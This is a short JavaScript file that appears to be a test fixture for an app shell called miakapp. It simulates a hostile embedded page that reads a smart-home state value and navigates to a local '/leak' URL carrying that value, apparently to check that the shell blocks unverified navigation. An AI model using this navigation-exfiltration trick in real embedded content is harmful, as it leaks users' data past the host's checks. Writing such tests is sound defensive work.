// Tries to replace itself with a page the shell never verified, carrying data.
document.body.textContent = 'leaving';
window.miakapp.ready();
setTimeout(() => {
  location.href = 'http://127.0.0.1:4173/leak?nav=' + encodeURIComponent(String(window.miakapp.state.get('zone.living.light.on')));
}, 100);
